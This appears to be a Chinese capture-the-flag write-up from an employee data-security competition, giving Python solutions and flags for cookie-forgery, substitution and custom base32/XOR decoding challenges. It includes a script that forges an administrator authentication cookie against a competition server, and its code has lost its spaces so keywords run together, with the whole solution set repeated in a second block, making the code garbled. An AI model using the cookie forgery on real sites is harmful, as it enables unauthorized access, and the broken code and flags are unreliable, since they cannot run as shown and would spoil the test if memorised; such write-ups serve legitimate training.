# 第二届职工数字化应用技术技能大赛-数据安全管理员-线上技能大比武WriteUp

> 原文: https://www.ctfiot.com/281761.html
> ID: 281761

点击上方蓝字·关注我们

前言：

第一次参加已职工身份参加线上比武记录下

本次排名总成绩11，不知道前面的wp没写的会不会ban！

csdn主页：https://blog.csdn.net/Aluxian_?type=lately

一、数据安全：

1.数据泄露：

这个题修改cookie其实是省赛原题，也可以写代码

fromdatetimeimportdatetime, timezonefromurllib.parseimportquote_plusimportrequestsdefutc_stamp_for_cookie(dt: datetime |None=None) ->str: ifdtisNone: dt = datetime.now(timezone.utc) returndt.strftime("%Y-%m-%dT%H:%M:%S+0000")defbuild_cookie_value(user:
str) ->str: date_str = utc_stamp_for_cookie() raw =f"username={user}&date={date_str}&" returnquote_plus(raw)defsend_request(): url ="http://106.14.104.133:
32936/index.php" cookie_value = build_cookie_value("administrator") cookies = {"auth": cookie_value} headers = { "User-Agent":"Cookie-Test/1.0", "Accept":"*/*", } withrequests.Session()assess: resp = sess.get(url, headers=headers, cookies=cookies, timeout=10) print("Status:", resp.status_code) print("Sent-Cookie auth=", cookies["auth"]) print("Body preview:", resp.text)if__name__ =="__main__": send_request()

flag{5956462019654412}

3.数据混淆：

! →1，@ →2，# → 3，$ → 4，% → 5，^ →6，& →7，* →8，( →9，) →0

flag{622622591307890225}

4.数据脱敏：

byte_4020C0="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"

frompathlibimportPathalphabet ="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"table = {c: ifori, cinenumerate(alphabet)}defb32_custom_decode(s:
str) ->bytes: s = s.strip().replace("r","").replace("n","") bits =0 bitlen =0 out =bytearray() forchins: ifch =="=": break v = table[ch] bits = (bits <<5) | v bitlen +=5 whilebitlen >=8: bitlen -=8 out.append((bits >> bitlen) &0xFF) returnbytes(out)defunxor(data:
bytes) ->bytes: ifnotdata: returndata key =b"37704cf0" res =bytearray(data) res[0] ^=0x33 foriinrange(1,len(res)): res[i] ^= key[i &7] returnbytes(res)
# 解密整文件p = Path("/mnt/data/info_94e0682.ori.en")lines_decoded = []withp.open("r", encoding="utf-8", errors="ignore")asf: forlineinf: enc = line.strip() xored = b32_custom_decode(enc) plain = unxor(xored) try: text = plain.decode("utf-8") exceptUnicodeDecodeError: text = plain.decode("latin1") lines_decoded.append(text)
# 取第 12 行与第 2 列（按空白/逗号分列）importreline12 = lines_decoded[11]cols = [cforcinre.split(r"[,t| ]+", line12)ifc]print("Line 12:", line12)print("Col 2 :", cols[1])

第12行明文：25813085410865975201629227428a7d1979@b9.com第12行第2列为：865975201629227428

flag{865975201629227428}

5.数据脱敏：


```
fromdatetimeimportdatetime, timezonefromurllib.parseimportquote_plusimportrequestsdefutc_stamp_for_cookie(dt: datetime |None=None) ->str: ifdtisNone: dt = datetime.now(timezone.utc) returndt.strftime("%Y-%m-%dT%H:%M:%S+0000")defbuild_cookie_value(user:
str) ->str: date_str = utc_stamp_for_cookie() raw =f"username={user}&date={date_str}&" returnquote_plus(raw)defsend_request(): url ="http://106.14.104.133:
32936/index.php" cookie_value = build_cookie_value("administrator") cookies = {"auth": cookie_value} headers = { "User-Agent":"Cookie-Test/1.0", "Accept":"*/*", } withrequests.Session()assess: resp = sess.get(url, headers=headers, cookies=cookies, timeout=10) print("Status:", resp.status_code) print("Sent-Cookie auth=", cookies["auth"]) print("Body preview:", resp.text)if__name__ =="__main__": send_request()
! →1，@ →2，# → 3，$ → 4，% → 5，^ →6，& →7，* →8，( →9，) →0
byte_4020C0="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"
frompathlibimportPathalphabet ="FNT5BMYAJD4IHLKU6RE3VQWGCO27SPZX"table = {c: ifori, cinenumerate(alphabet)}defb32_custom_decode(s:
str) ->bytes: s = s.strip().replace("r","").replace("n","") bits =0 bitlen =0 out =bytearray() forchins: ifch =="=": break v = table[ch] bits = (bits <<5) | v bitlen +=5 whilebitlen >=8: bitlen -=8 out.append((bits >> bitlen) &0xFF) returnbytes(out)defunxor(data:
bytes) ->bytes: ifnotdata: returndata key =b"37704cf0" res =bytearray(data) res[0] ^=0x33 foriinrange(1,len(res)): res[i] ^= key[i &7] returnbytes(res)
# 解密整文件p = Path("/mnt/data/info_94e0682.ori.en")lines_decoded = []withp.open("r", encoding="utf-8", errors="ignore")asf: forlineinf: enc = line.strip() xored = b32_custom_decode(enc) plain = unxor(xored) try: text = plain.decode("utf-8") exceptUnicodeDecodeError: text = plain.decode("latin1") lines_decoded.append(text)
# 取第 12 行与第 2 列（按空白/逗号分列）importreline12 = lines_decoded[11]cols = [cforcinre.split(r"[,t| ]+", line12)ifc]print("Line 12:", line12)print("Col 2 :", cols[1])
第12行明文：25813085410865975201629227428a7d1979@b9.com第12行第2列为：865975201629227428
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762917702-wxsync-2025-11-f4dd000cea4bf9f74ed932731079694c.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762917704-wxsync-2025-11-a8f45598cf1a3d1d063fee7dc3b7301b.webp)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762917710-wxsync-2025-11-3a3d4aeaabdfdac873381d05d6a9c61e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762917712-wxsync-2025-11-e6e572789df8ed9729ec740134252047.png)